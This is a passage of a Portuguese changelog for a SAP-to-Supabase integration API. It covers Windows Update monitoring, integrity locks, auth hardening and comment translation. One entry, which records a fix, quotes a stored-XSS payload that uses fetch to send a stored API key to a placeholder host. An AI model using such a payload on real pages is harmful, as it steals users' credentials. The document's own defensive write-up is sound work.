# Changelog

Mudanças notáveis deste projeto. Formato inspirado em
[Keep a Changelog](https://keepachangelog.com/pt-BR/1.1.0/).

## [2026-07-16] — Comentários dos pipelines traduzidos para inglês técnico (onda 2/5)

Segunda onda: `pipeline_core.py`, `extract_sap_to_supabase.py` e
`extract_ordens_servico_engenharia.py`.

Mesma garantia da onda 1 — AST sem docstrings idêntico nos três, `ruff` limpo, 271 testes
passando — e uma varredura extra por comentário em PT que tivesse escapado (os 9 hits
eram falsos positivos: palavras inglesas colidindo com tokens PT, como `# pragma: no
cover` e `what to do`).

Aqui estava a maior parte do conhecimento caro do repositório: os comentários que
explicam *por que* o código é assim. Foram preservados na íntegra, não resumidos —
o `neq` que não pega `NULL`, a janela entre insert e poda que some com o pedido, o
naive datetime que vira UTC no `timestamptz`, a guarda de schema do PGRST204.

### Alterado

- `pipeline_core.py`, `extract_sap_to_supabase.py`,
  `extract_ordens_servico_engenharia.py`: comentários e docstrings traduzidos para
  inglês técnico.

## [2026-07-16] — Comentários do núcleo traduzidos para inglês técnico (onda 1/5)

Primeira onda da tradução dos comentários do repositório para inglês técnico:
`config.py`, `db_utils.py`, `retry.py`, `feriados_br.py`, `sap_connection.py`.

**Só comentário e docstring mudaram** — nenhuma linha executável. A garantia é mecânica:
um checador compara o AST de cada arquivo antes/depois **com os docstrings removidos**, e
os cinco saíram idênticos. (Comparar o AST cru não serve: docstring é nó do AST, então
toda tradução apareceria como diff.) `ruff check` limpo e os 271 testes passando.

Fora de escopo por decisão: mensagens de log e de erro seguem em PT (são lidas em
produção), assim como `README`/`CHANGELOG`/`CLAUDE.md`. Termos de domínio (`N_PED`,
`SITCOD`, `oportunidades`, `Ordens de Serviço`, `Integração WBC`, `VW_OS_INTEGRACAO`) e
identificadores Python (`MESES_RETROATIVOS`, `_BOOL_VERDADEIRO`, `wu_varredura_max_d`)
ficam como estão — renomear seria mudança de código, não de comentário.

Pendente: ondas 2-5 (pipelines, serviço, testes, MCP+HTML). Na onda 5 há uma decisão
aberta — os docstrings dos `@mcp.tool()` em `mcp/mcp_server.py` **não são comentários**:
o FastMCP os envia ao LLM como descrição da tool, e os nomes das tools são portugueses.

### Alterado

- `config.py`, `db_utils.py`, `retry.py`, `feriados_br.py`, `sap_connection.py`:
  comentários e docstrings traduzidos para inglês técnico, com simplificação onde coube.

## [2026-07-16] — O motivo do "não sei" agora diz QUANTOS dias

Ajuste fino, depois de ver o painel real da Mira em produção. O `pendentes_motivo` mostrava
o texto genérico e ASCII do PowerShell — *"o agente nao varre ha tempo demais"* — quando o
Python já montava um melhor, **com o número**: *"o agente não varre há 610 dias"*. Um
`motivo or ...` deixava o do PS ganhar.

É o texto que o usuário lê no chat, e "há tempo demais" faz perguntar *quanto*. No ramo de
varredura velha a mensagem daqui passa a ser a autoritativa — é a camada que sabe a contagem
de dias, tem acento e tem testes. **Não se perde motivo específico:** com a varredura velha o
PS nem tenta a busca, então o motivo dele é sempre o genérico; o `"busca falhou: 0x..."` vive
no ramo `pendentes is None`, que segue repassando o do PS intacto (há teste cravando os dois).

Mesmo ajuste no `windows_update.py` do repo SAP_RDP — os dois módulos seguem diffáveis.
**273 testes, lint 0.**

## [2026-07-16] — Windows Update não alerta mais: é informação, não saúde do sistema

Ajuste logo após o deploy da F2 (abaixo). **O bloco `windows_update` não gera mais alerta
nenhum** — nem reboot pendente, nem update pendente.

Decisão do Marcelo: *"tem que ser simples e não travar o sistema; se um dia der errado não
importa; se um dia o servidor não reiniciar não importa"*. Isto reverte a D1 do plano. O
raciocínio é direto: alerta derruba `healthy` e faz o `?strict=1` responder **503** — era o
**único** ponto em que este módulo mexia no comportamento de quem monitora a integração do SAP.
Monitoramento de patch é informação útil; não é motivo para declarar a integração degradada.

**Os dados continuam todos publicados** (`/status?checks=windows_update` e a tool MCP
`estado_windows_update`): reboot pendente, updates pendentes, último patch, dias sem patch.
Eles só não acendem alarme sozinhos. Quem quiser saber, pergunta.

A medição colhida no deploy já apontava para cá: o reboot pendente desta máquina vem **só** do
`PendingFileRenameOperations` (CBS e WindowsUpdate estão limpos) — o mais barulhento dos 3
sinais — e cresceu **32 → 48 → 64 no mesmo dia**, com a máquina reiniciando toda manhã às
06:12. O alerta ficaria aceso quase todo dia: exatamente o alarme crônico que a D1 original
queria evitar para os updates, só que no outro campo. A decisão do Marcelo mata isso na raiz e
mais simples — sem alerta nenhum.

### Alterado

- `monitoring.py`: removida a função `_windows_update_alerts` e sua chamada em `collect_status`.
- Testes: `test_windows_update_nunca_gera_alerta` substitui os 3 anteriores e crava o pior caso
  (reboot pendente + 47 updates + 90 dias sem patch → `healthy: True`, `alerts: []`, dado
  publicado). **271 testes, lint 0.**

### Validação da F2 em produção (deploy feito)

Ponta a ponta na .11: logo após subir, `estado: "coletando"` + `pendentes: null` — o aceite
contraintuitivo, **não `0`**. Aos 300 s a thread acordou, coletou em 4,9 s e publicou
`pendentes: 3`, `ultimo_patch 2026-06-30 (KB5094147)`, `dias_sem_patch 16` — **exatamente os
números que a F0 mediu à mão**, por um caminho de código completamente diferente.

## [2026-07-16] — Windows Update e reboot pendente no `/status` (F2 do PLANO_WINDOWS_UPDATE)

Fase F2 do plano que vive em `../SAP_RDP/docs/PLANO_WINDOWS_UPDATE.md` (a F1 fez o mesmo na
.12). **O desenho inteiro vem de medição nas máquinas reais, não de estimativa** — e o achado
que o justifica é caro: a **.12 estava há 610 dias sem patch** enquanto respondia
*"0 updates pendentes"*, em 22,5 s, confiante.

**A armadilha central: "0 pendentes" MENTE quando o agente não varre.** Não é um erro que dá
para tratar com `try/except` — a busca `IsInstalled=0` **responde**, cara, e devolve **0**,
porque o cache de varredura do agente está vazio. Por isso a contagem só é publicada quando a
última varredura é recente (`LastSearchSuccessDate`, COM `Microsoft.Update.AutoUpdate`, 7-17 ms);
senão sai **`None` + o motivo**. **`None` nunca pode virar `0`.**

### Adicionado

- **`windows_update.py` (novo)** — porte do módulo homônimo do repo SAP_RDP; **os dois devem ser
  mantidos diffáveis** (bug corrigido em um vai para o outro). Reboot pendente via `winreg`
  (**0,2 ms**, não depende do agente — a .12 leu todas as chaves com o serviço desabilitado),
  updates pendentes e último patch via COM/PowerShell.
- **Check `windows_update` no `/status`** (`SELECTABLE_CHECKS` + `collect_status`), com bloco
  de topo `windows_update` (irmão de `checks`/`alerts`, como o `scheduled_task`). Aliases no
  `?checks=`: `wu`, `update`, `updates`, `patch`, `reboot`, `windowsupdate`.
- **Tool MCP `estado_windows_update`** na fachada 8078 (11 tools). Pede o bloco **isolado**
  (`?checks=windows_update`), sem abrir as 3 conexões de teste. A docstring é load-bearing:
  proíbe o LLM de relatar "0 pendentes" quando o valor é `null`, e desambigua desta máquina
  (192.168.7.11) para o servidor RDP (192.168.7.12), que tem tools próprias.
- **Config**: `WU_ENABLED`, `WU_DELAY_START_S` (300), `WU_VARREDURA_MAX_D` (7),
  `WU_COLETA_TIMEOUT_S` (120) + helpers `_env_bool`/`_env_float`. O `_env_float` **rejeita lixo
  e cai no default**: além de não derrubar a API no boot, é o que impede injeção de PowerShell
  pelo `.env` (o `WU_VARREDURA_MAX_D` é interpolado no script da coleta).
- **52 testes novos** (221 → **273**), lint 0.

### Arquitetura — por que thread daemon, e não cache preguiçoso

A busca custa **3,1 s aqui**, 22,5 s na .12 e 30 s a frio: **varia 10×** e estoura o timeout de
15 s de quem consulta. Um cache lazy faria a 1ª pergunta do dia dar timeout. Então a coleta cara
roda numa **thread daemon** disparada no `api.main()` (+5 min) e o `/status` **só lê o cache** —
medido: **0,04 ms** no caminho síncrono, contra 12,8 s da coleta real. Cache em **memória, sem
JSON e sem Task Scheduler**: **o boot é o agendamento** (esta máquina reinicia todo dia ~06:12,
então um job "1×/dia às 03:00" nunca dispararia).

### Decisão D1 — só **reboot** vira alerta; update pendente é informativo

Alerta derruba `healthy` → `?strict=1` responde **503** e a Mira diz "⚠️ atenção". Esta máquina
tem `AUOptions=4` (baixa e instala sozinha) e **é isso que a mantém em dia** (16 dias no último
patch): update pendente é rotina e viraria alerta permanente — e alarme que vive ligado treina
todo mundo a ignorar o monitor. ⚠️ **Não "corrigir" a política desta máquina para `AUOptions=2`**:
foi desligar a automação que deixou a .12 610 dias para trás. *O remédio de uma é o veneno da
outra.*

> **Consequência imediata do deploy:** esta máquina **tem reboot pendente agora** (`PFRO(32)`,
> medido na F0). Assim que a F2 subir, o `/status` passa a acusá-lo — `healthy: false` e **503 no
> `?strict=1`** — até a máquina reiniciar limpa. Isso é a D1 funcionando: o fato já existia, só
> era invisível.

### Tri-estado: erro de leitura nunca vira "sem reboot pendente"

`pendente` é `true`/`false` (fatos) ou **`null`** (não deu para ler — o `erro` explica). Um
`Test-Path` booleano faria a API **afirmar** "sem reboot pendente" num acesso negado: falso
negativo silencioso no dado mais crítico. Mesmo princípio do `[]` vs `None` do `_quser_sessions`
no repo SAP_RDP. Falha na leitura também não derruba o `/status` inteiro (viraria 500 e levaria
SAP/SQL/Supabase junto) — vira "não sei", com o bloco preservado.

### Armadilhas que a revisão adversarial da F1 já tinha pago (aplicadas aqui de saída)

- **A suíte não pode ler o estado da máquina.** `_stub_all_ok` stuba `_windows_update_signal`:
  sem isso os testes leriam o **winreg real** e quebrariam **nesta máquina**, que tem reboot
  pendente. E a "correção" óbvia — apagar o alerta — deixaria a suíte **verde violando a D1**.
  Verificado rodando a suíte inteira com um reboot pendente **simulado**: 273 passam.
- **Defesa em profundidade**: o Python **reaplica** a regra de frescor (`_filtrar_contagem`)
  mesmo o PowerShell já a aplicando — a invariante nº 1 não pode ter ponto único de decisão do
  outro lado de um subprocess, e esta camada é a que tem testes.
- **`time.sleep()` DENTRO do try**: `.env` com `-1`/`nan`/`inf` matava a thread antes de gravar
  e o estado ficava `"coletando"` **para sempre**.
- **O PowerShell escreve em cp850, não UTF-8** (medido): sem forçar `[Console]::OutputEncoding`
  na 1ª linha, `"Atualização"` chega `"Atualiza??o"` — o campo `erro` vem de mensagem localizada
  do Windows.
- **`WU_VARREDURA_MAX_D` vai ao PS como `float`, não `int`**: truncar faria o PS usar 7 com o
  `.env` pedindo 7,9, divergindo em silêncio do limite reaplicado no Python.

Verificação além da suíte: as três invariantes foram **mutation-testadas** (apagar o alerta de
reboot, publicar `0` no lugar de `null`, tirar o check do `SELECTABLE_CHECKS`) — as três mutações
quebram testes. E a coleta real rodou ponta a ponta: 12,8 s, varredura de 0,2 dia → publicou um
`pendentes: 0` **legítimo** com `ultimo_patch KB5101650` batendo com o `Get-HotFix`.

## [2026-07-16] — Duas duplicações que pagavam: retry único e guarda de auth por decorator

As duas simplificações que a revisão aprovou. As grandes (unificar os 2 conjuntos de
settings, fatorar os `main()`) foram **recusadas** por serem *coincidência de forma*, não
duplicação — o que era genérico de verdade já está no `pipeline_core`.

### Alterado

- **`retry.py` (novo): uma implementação de retry, não duas.** `sap_connection._with_retries`
  era cópia **byte-a-byte** de `pipeline_core.with_retries` (mesma assinatura, mesmo backoff,
  só as mensagens em inglês vs. português). Mexer na política de retry exigia lembrar dos
  **dois** lugares — e o do SAP era o esquecido.

  **Por que módulo novo e não `sap_connection` importando `pipeline_core`:** medido, o
  `pipeline_core` custa **~1,2 s** de import porque arrasta `supabase`/`numpy`; hoje
  `sap_connection` só puxa `pandas`+`hdbcli`. Fazê-lo importar o núcleo cobraria esse preço
  do **agendador**, que não usa Supabase. `retry.py` não tem dependência nenhuma. Verificado
  depois: `import sap_connection` **não** puxa `supabase`. Os dois módulos mantêm wrappers
  finos só para aplicar os defaults (`RETRY_ATTEMPTS`/`RETRY_BASE_DELAY_S`), então **nenhum
  call-site mudou**.

- **`@requer_chave`: a guarda de auth virou decorator.** O bloco
  `if not _autorizado(): return 401` estava colado em **11 rotas**. O ganho não é linha (o
  saldo é ~zero) — é matar a classe de bug **"rota nova sem guarda"**: o padrão anterior
  dependia de alguém lembrar, e o repo cresce. Continuam abertas de propósito `/`,
  `/favicon.ico`, `/health` e `/status`.

  `@wraps` é obrigatório: sem ele o Flask usaria o nome do wrapper como endpoint e a 2ª rota
  colidiria no registro.

6 testes novos (221 no total). O que blinda a mudança é um que **varre o `url_map`**: toda
rota fora da lista de abertas *tem* de devolver 401 sem chave — quem adicionar uma rota e
esquecer o decorator quebra no teste, não em produção. Mais: as 4 abertas continuam abertas,
e os endpoints do Flask não colidem (guarda o `@wraps`).

## [2026-07-16] — Feriados: a tabela acaba em 2030 e agora avisa (antes falhava calada)

### Corrigido

- **A partir de 01/01/2031 o agendador rodaria carga no feriado, em silêncio.** A tabela de
  feriados vai de 2024 a 2030; fora disso, `is_national_holiday` devolve `False` e
  `is_business_day(date(2031, 1, 1))` respondia **`True`** — Ano-Novo virava dia útil, sem
  aviso nenhum. É o tipo de bug que dorme anos e acorda no pior dia. Agora `is_business_day`
  **loga um WARNING** quando a data sai da cobertura, dizendo o intervalo conhecido e como
  consertar (`HOLIDAY_YEAR_END`). Novo helper `covers(d)`. O comportamento não muda dentro
  de 2024-2030, e o caminho normal não polui o log.

### Alterado

- **Consciência Negra virou feriado fixo na tabela.** O `if year >= _BLACK_CONSCIOUSNESS_FROM_YEAR`
  era **sempre verdadeiro** — a constante é 2024 e a tabela **começa** em 2024. Como a data é
  nacional desde 2024 (Lei 14.759/2023), foi para `_FIXED_HOLIDAYS` com o porquê no
  comentário. Verificado que o conjunto de feriados é **idêntico** ao anterior (91 datas,
  zero diferença) — refatoração puramente estrutural.

### Documentado (código morto que fica de propósito)

- **`db_utils.read_dbapi_query(params=...)`** está inalcançável desde que o
  `extract_wbc_arvore` saiu na consolidação (era seu único usuário). **Mantido**: é a única
  porta para consulta parametrizada quando aparecer o próximo `WHERE x = ?`. Remover
  economizaria 3 linhas e apagaria a defesa contra injeção. O docstring agora diz isso, para
  ninguém "limpar" depois.

> **Não removido, por verificação:** os aliases PT do `feriados_br` (`eh_dia_util`,
> `eh_feriado_nacional`, `feriados_nacionais`) foram reportados como "sem consumidor" — mas
> `tests/test_feriados_br.py` e `tests/test_scheduler.py` os importam. Apagar quebraria a
> suíte. `exports/*.json` (2 MB, gitignorado) são dados de cliente — limpeza é decisão do
> Marcelo, não minha.

5 testes novos (215 no total): `covers` nas bordas (2023/2024/2030/2031); fora da cobertura
**avisa** e diz como consertar; dentro **não** loga; fim de semana ainda vale fora da tabela;
e Consciência Negra presente em todos os anos cobertos (guarda a refatoração).

## [2026-07-16] — `/status`: fim do alarme falso diário do agendador

### Corrigido

- **~30 min de alerta falso TODO dia útil, às 07:00.** Quando a janela comercial abria, a
  última carga era a de ~18:5x do dia anterior (~780 min atrás) → `stale=True` → alerta, e
  **503** para quem usa `?strict=1`. O alarme só sumia quando a 1ª execução do dia rodava —
  o que o `IntervalTrigger` pode levar até um intervalo inteiro para fazer. Ou seja: o
  monitor gritava justamente no horário em que as pessoas chegam. Agora há **carência na
  abertura** (`warming_up`): dentro do 1º ciclo da janela, ausência de carga é o esperado,
  não sintoma.

- **Limiar de "agendador parado" era fixo (35 min) enquanto o intervalo é configurável.**
  Com `INTERVALO_MINUTOS=60`, o `/status` passaria a acusar "agendador possivelmente parado"
  **o dia inteiro** — e `?strict=1` devolveria **503 permanente** — com tudo funcionando.
  Agora o limiar é **derivado**: `scheduler_stale_min()` = `INTERVALO_MINUTOS` + folga (5).
  Com o default de 30 dá **35** — exatamente o valor antigo, então **nada muda em produção**;
  o número fixo era uma coincidência esperando quebrar. A mensagem do alerta e o
  `threshold_min` do payload passam a mostrar o limiar real.

  > **Por que isto importa mais do que parece:** alarme falso recorrente treina todo mundo a
  > ignorar o monitor. Um `/status` que grita à toa todo dia às 07:00 é pior que não ter
  > monitor — e anula o valor do fix de ontem (o check inválido que devolvia "tudo verde").

5 testes novos (210 no total), com relógio e log falsos: a abertura da janela (07:12, carga
de ontem 18:52) **não** alarma; agendador parado de verdade (3h sem carga) **alarma**; com
`INTERVALO_MINUTOS=60` uma carga de 45 min atrás é normal (limiar 65) mas 90 min alarma; e
fora da janela nunca alarma.

## [2026-07-16] — Contrato: trava anti-loop nas rotas que faltavam, 502 no lugar de 200, e auth em tempo constante

### Corrigido

- **`/sync/ordens-servico` e `/sync/ordens-servico/<nped>` não tinham a trava anti-loop.**
  São rotas de **escrita**, mas só o par `/ordens-servico/<nped>/sincronizar` chamava
  `_checar_rate` — um agente em loop batendo nelas disparava syncs SAP→Supabase ilimitados,
  furando a proteção que o `CLAUDE.md` descreve como cobrindo "as escritas". Agora as duas
  usam o **mesmo bucket** (`sync_os`) do par: o limite é do **recurso**, não da rota — senão
  bastava alternar entre elas para dobrar o teto.

- **`POST /sync/ordens-servico` aceitava lista de qualquer tamanho.** O lote roda
  **serializado dentro do `_sync_lock`**, com 2 conexões HANA por pedido: `{"npeds":
  [1..5000]}` era **uma** request segurando a fila por horas, com cada tentativa
  concorrente consumindo um thread do waitress à espera → pool esgotado → a API inteira
  parava de responder, `/health` incluído. Novo teto **`SYNC_LOTE_MAX`** (default **50**,
  configurável) → **413** acima disso. 50 é folgado para o uso real (a tela oferece 30 em
  "Buscar na Lista").

- **Falha de sincronização de oportunidades respondia HTTP 200.** O `return` final não tinha
  status code, e o Flask assume 200 — enquanto o `except` logo acima já devolvia **502**
  para a **mesma** classe de problema (a carga não aconteceu). Qualquer monitor que decida
  por status code — o padrão — lia a falha como sucesso. Agora **502**, coerente com o irmão.

- **`_autorizado()` comparava a chave com `==`.** Comparação curto-circuitada: para no 1º
  byte diferente, e o tempo de resposta vaza quantos bytes o palpite acertou — dá para
  descobrir a chave byte a byte. Agravante: a API aceita a chave por **query string**, então
  o ataque é um `GET` em loop, sem rate-limit nas leituras. Agora `hmac.compare_digest`
  (tempo constante), como o `mcp/serve_http.py` já fazia. Dois detalhes que evitam trocar um
  bug por outro: chave ausente vira **401** (não `TypeError` → 500, porque `compare_digest`
  não aceita `None`) e os operandos são **encodados** (chave com acento levantaria
  `TypeError` — `compare_digest` exige bytes ou ASCII puro).

9 testes novos (205 no total), incl. os dois buracos exatos (lote de 5000 ⇒ 413 e nada
sincronizado; as duas rotas compartilhando o bucket) e a matriz de auth (prefixo, sufixo,
vazio, não-ASCII).

## [2026-07-16] — Integridade: o par insert+poda deixa de perder e de duplicar dado

Os 4 achados da revisão que podiam **perder ou corromper dado** — os únicos com esse
poder; o resto era ruído ou tinha dano limitado. Raiz comum: **o par insert+poda não é
atômico e não tinha lock cross-process**, então uma falha no meio (ou um 2º processo)
deixava a tabela num estado que a leitura interpretava errado, **em silêncio**.

### Corrigido

- **Dois processos no mesmo pedido APAGAVAM o pedido.** O `_sync_lock` da `api.py` é
  `threading.Lock` — serializa as threads do waitress e mais nada. Mas o pipeline também
  tem CLI (`python extract_ordens_servico_engenharia.py 84080`), então dois **processos**
  podiam gravar o mesmo `N_PED`:

  ```text
  A insere (exec_A)          B insere (exec_B)
  A poda tudo != exec_A  ->  apaga as linhas de B
  B poda tudo != exec_B  ->  apaga as linhas de A
  => o pedido SOME — e os dois logam 'sucesso'
  ```

  Novo **`pipeline_core.os_sync_lock(nped)`** (FileLock cross-process) em volta de
  insert+poda, dentro do `main()` — no pipeline, não no chamador, então **API e CLI ficam
  protegidos igual**. **Por pedido, não global**: o invariante é *um escritor por `N_PED`*;
  um lock único bloquearia pedidos diferentes sem motivo. Na API, colisão vira **`409`
  `ocupado`** (não `502 erro`) — distinguir "outro processo está sincronizando" de "falhou"
  evita caçar problema que não existe.

- **O CLI de oportunidades podia ESVAZIAR a tabela.** `api.py` e o agendador já pegavam o
  `oportunidades_sync_lock`, mas o `if __name__ == "__main__"` passava **por fora**. Rodar
  o script à mão durante a carga do agendador reproduzia o cenário acima em escala global
  (snapshot poda a tabela inteira). Agora o entrypoint pega o lock; se já houver carga,
  avisa e sai com exit 1 **sem tocar em nada**.

- **Insert parcial deixava a tabela com o total inflado.** O insert é em lotes e **não há
  transação entre eles**: lote 3 de 5 estoura → os lotes 1-2 ficam gravados. Como a poda só
  roda no sucesso, sobravam a execução anterior **+** o pedaço da nova, e
  `_soma_total_orcamento` somava **as duas** (é a classe do incidente de 06/07: R$ 96,78 num
  orçamento de R$ 3 mi). Agora `insert_data` **reverte o parcial** apagando por
  `id_execucao` — preciso e seguro, o UUID é só daquela carga. Se a limpeza também falhar,
  loga o `delete` exato para rodar à mão.

- **Poda falha → o log dizia `sucesso`.** Insert OK + poda falha = duas execuções do pedido
  na tabela e leitura somando em dobro; era um `WARNING` e a função devolvia `True`, então o
  histórico afirmava sucesso com a tabela corrompida. Agora devolve **`False`** (o contrato
  "substitui, não duplica" não foi cumprido), o log grava `falha` e a mensagem diz o que
  fazer. Vale para os dois pipelines (`replace_nped` e `snapshot`). Re-sincronizar consolida.

- **Linha com `id_execucao` NULL sobrevivia a TODA poda.** `.neq('id_execucao', id)` vira
  `id_execucao <> 'x'`, que em SQL avalia **NULL** (não TRUE) para linha nula — o `DELETE` a
  ignorava, **para sempre**. Órfã de carga manual/import ficaria duplicando o dado servido
  eternamente. Agora usa `or_(id_execucao.is.null,id_execucao.neq.<id>)`; o `where_eq`
  continua em AND. Hoje há **0 linhas** nesse estado (medido) — era latente.

  > Verificado antes de escrever: o filtro gerado é
  > `or=(id_execucao.is.null,id_execucao.neq.<uuid>)&N_PED=eq.84080`, com o UUID passando
  > sem aspas. Um `.or_()` errado quebraria a poda — pior que o bug latente que corrige.

6 testes novos (193 no total), cada um guardando um invariante que não existia: reversão do
parcial apaga **exatamente** a execução da carga; o lock é exclusivo **por pedido** e não
bloqueia pedidos diferentes; a poda usa `or_` (o teste falha se voltar ao `neq` puro);
insert+poda acontecem **dentro** do lock; poda falha ⇒ `main` retorna False **e** o log
grava `falha`.

## [2026-07-16] — Horários 3h errados, XSS que vazava a API key, e `/status` que mentia

### Corrigido

- **Todo horário de sincronização estava 3h no passado.** `datetime.now().isoformat()` produz
  string **naive** (`'16:43:30'`); a coluna `data_hora_sincronizacao` é **`timestamptz`**, e o
  Postgres assume **UTC** ao gravar → um evento das 16:43 BRT virava `16:43:30+00` = 13:43 BRT.
  **O painel "Últimas sincronizações" mostrava tudo 3h errado.** Medido no banco:

  | Entrada | Coluna | Resultado |
  | --- | --- | --- |
  | `'16:43:30'` (antes) | `timestamptz` | `16:43:30+00` ❌ 3h atrás |
  | `'16:43:30-03:00'` (agora) | `timestamptz` | `19:43:30+00` ✅ instante certo |
  | `'16:43:30-03:00'` | `timestamp` | `16:43:30` ✅ offset ignorado |
  | `'16:43:30'` (antes) | `timestamp` | `16:43:30` ✅ idêntico |

  Novo helper **`pipeline_core.agora_iso()`** (= `datetime.now().astimezone().isoformat()`),
  usado nos 3 pontos que gravam hora (`prepare_data` + os 2 logs de sync). As 2 últimas linhas
  da tabela acima são o motivo de dar para usar a **mesma** função nos dois tipos de coluna: o
  Postgres **descarta** o offset em `timestamp without time zone`, então `data_hora_extracao`
  não muda em nada. Um conserto, zero efeito colateral.

  > ⚠️ **Linhas já gravadas continuam 3h erradas** — o fix não reescreve o passado. Como o log
  > é podado (100 mais recentes na OS, 6 em oportunidades), elas somem sozinhas conforme novas
  > cargas rodam. Corrigir à mão exigiria `UPDATE ... + interval '3 hours'` **só nas linhas
  > anteriores ao deploy** — não feito, para não estragar as novas.

- **XSS armazenado na página de sincronização → exfiltrava a `OS_API_KEY`.** `sincronizar.html`
  interpolava dados do servidor em `innerHTML` **sem escape nenhum**. O vetor mais exposto:
  `cliente` vem de **`ORDR.CardName` do SAP** e ia cru para a lista de "Buscar na Lista" — uma
  razão social como `<img src=x onerror="fetch('http://x/'+localStorage.os_api_key)">` executava
  no browser de quem abrisse a lista, e a página guarda a chave no `localStorage`. Também eram
  sinks: `motivo`, `nped` (inclusive dentro de `value="..."`, permitindo **quebrar o atributo**),
  os contadores do resumo, e `fmtTime`, que devolve o **ISO cru** quando a data não parseia.

  Adicionado `esc()` (`& < > " '`) e aplicado em **todas** as interpolações de dado do servidor.
  Verificado com o payload real: vira texto inerte, e a quebra de atributo também. Corrigido de
  quebra `data.items.length` sem guard (`.length` de `undefined` exibia *"API no ar?"* — mensagem
  enganosa: a API respondeu 200).

- **`/status?checks=<nome inválido>` respondia `200 {"healthy": true}` sem ter checado NADA.**
  Um nome fora de `SELECTABLE_CHECKS` não casava com nenhum `if`, `checks` saía vazio e
  **`all([])` é `True`** → `ok: true`, `healthy: true`, `alerts: []`, e **`?strict=1`
  devolvia 200**. Reproduzido em produção antes do fix:

  ```text
  GET /status?checks=sqlserver2,agendador_typo&strict=1
  → 200 {"checks": {}, "healthy": true, "ok": true, "alerts": []}
  ```

  **Impacto:** um monitor com typo na URL reportava saúde perfeita **para sempre**, sem
  nunca checar coisa alguma — falha silenciosa no componente cujo único trabalho é detectar
  falhas. Pior no MCP: `verificar_saude(checks=...)` repassava o verde falso em linguagem
  natural, e a docstring da tool não listava os valores válidos (convite ao chute do LLM).

  **Agora:** `collect_status` **levanta `ValueError`** para nome desconhecido e o `/status`
  traduz para **400**, respondendo `aceitos` (canônicos **e** aliases). Falhar alto é
  deliberado — 400 barulhento é melhor que verde falso. O caminho normal segue igual:
  sem `?checks=` roda tudo; subconjunto válido e aliases (`wbc`→`sql_server`,
  `tarefa`→`scheduled_task`) inalterados.

  Documentado também que `ok`/`healthy` refletem **só o que rodou** — pedir subconjunto é
  escolha de quem chama e não afirma nada sobre o resto.

  7 testes novos (184 no total), incl. a regressão exata (`?checks=` inválido ⇒ nunca
  200/healthy, nem com `strict=1`) e a mistura válido+inválido (um nome bom não legitima o
  ruim).

## [2026-07-15] — Flags de processo, a coluna que faltava, e uma guarda para o PGRST204 nunca mais custar 40 min

### Adicionado

- **`API_OS_INTEGRACAO.md` — documento de handoff para as equipes consumidoras.** Cobre as
  duas superfícies separadamente: **API 8077** (nada removido/renomeado — o `resumo` só
  *ganhou* o bloco `processos`, então quem consome a API não muda código) e **leitura direta
  do Supabase pela `anon`** (aí é breaking: tabela nova, `NPED` → `N_PED`, e as 4 tabelas
  viraram filtros por flag). Enfatiza a regra que mais gera bug — **as flags são por ITEM,
  não por pedido** — e as armadilhas já vividas aqui (`TotalOrcam` por linha ⇒ somar;
  `order by "id"` obrigatório p/ cabeçalho). Lista o que deixou de existir, marcando como
  *aproximadas* as equivalências não confirmadas.
- **Guarda de schema no `insert_data` (origem × destino).** Antes de inserir, compara as
  colunas dos registros com as da tabela e, se faltar alguma, **falha na hora** com um log
  que já traz o `ALTER TABLE` pronto para colar:

  ```text
  [SCHEMA] A origem tem 2 coluna(s) que a tabela 'vw_os_integracao' NAO tem: U_INO_ORCITM, Pintura.
  O insert falharia com PGRST204. Rode no Supabase e sincronize de novo:

  alter table public.vw_os_integracao
    add column if not exists "U_INO_ORCITM" text,
    add column if not exists "Pintura" integer;

  notify pgrst, 'reload schema';
  ```

  Vale para **todos** os pipelines (está no núcleo, não no de OS). Ganhos sobre o
  comportamento anterior: nomeia **todas** as colunas faltantes (o PGRST204 só revela a
  **primeira** — some uma, aparece a próxima), **não escreve nada**, e sugere o tipo a
  partir do 1º valor não-nulo (`integer`/`numeric`/`boolean`/`timestamp`/`text`; só nulos
  ⇒ `text`, que aceita tudo). O tipo é **sugestão para conferir**, não verdade sobre o HANA.
- **Erro de schema deixou de ser retentado.** `PGRST204`/`PGRST205` são determinísticos —
  as 3 tentativas com backoff só atrasavam ~6s e afogavam a mensagem. Agora falham de
  primeira (`retry_on=_retry_se_transitorio`); o resto continua com retry normal.

  > **Ponto cego assumido:** o PostgREST não expõe o schema numa chamada simples, então as
  > colunas da tabela saem das **chaves de 1 linha real**. Tabela **vazia** ⇒ não dá para
  > saber ⇒ a guarda é **pulada** e o `PGRST204` do insert volta a ser o diagnóstico.
  > Preferimos o ponto cego explícito a bloquear a carga por dúvida.

### Adicionado (view)

- **4 flags de processo por item** (colunas 51-54 da view, `INTEGER`): **`Solda`**,
  **`Pintura`**, **`Almox`** e **`Exped`** — `1` = o item passa pelo processo, `0` = não.
  Elas **fecham a consolidação de 14/07**: substituem, por **4 colunas**, as **4 tabelas**
  dropadas (`vw_os_solda`, `vw_os_pintura_v0`, `vw_os_almox_impressao`,
  `vw_os_exped_impressao_v2`) — antes o processo era identificado pela *tabela* em que a
  linha aparecia (+ a coluna `TIPO`). A API expõe `resumo.processos = {solda|pintura|almox|
  exped: {tem, linhas}}`; são flags **por item**, então agrega (um pedido tem itens mistos)
  em vez de um booleano de cabeçalho, que seria enganoso. Validado em produção: pedido
  84172 → 344 linhas com solda 40 / pintura 72 / almox 55 / exped 127.

### Corrigido

- **`U_INO_ORCITM` faltava no espelho — a view tem 54 colunas, não 53.** A mesma revisão da
  view que trouxe as flags trouxe também essa coluna (posição 50), e ela derrubou **toda**
  sync de OS com `PGRST204`. Somada ao ALTER (`sql/alter_vw_os_integracao_flags_processo_2026-07-15.sql`)
  e ao DDL base. Tipo `text` — o mesmo que tinha na antiga `vw_os_solda`.

  > **Lição (o motivo da guarda acima):** o diagnóstico demorou porque a tabela foi
  > conferida contra uma lista de colunas **transcrita de um screenshot** do catálogo SAP —
  > que estava incompleta. O diff deu "nenhuma faltando" e o `PGRST204` foi descartado como
  > causa. A fonte de verdade é a view: `SELECT * FROM <view> WHERE "N_PED" = -1` (0 linhas,
  > só o schema). **Nunca transcrever à mão.** O log da API (`logs/api.log`) já nomeava a
  > coluna desde o primeiro segundo.

## [2026-07-14] — Consolidação: 6 espelhos de OS → 1 tabela `vw_os_integracao` (view HANA VW_OS_INTEGRACAO)

### Alterado

- **Uma única tabela `vw_os_integracao`** espelhando a view HANA consolidada
  `SBOALTAMIRAPROD.VW_OS_INTEGRACAO` (49 col: OS + estrutura/árvore + orçamento)
  substitui os 6 espelhos separados (`ordens_servico_engenharia`,
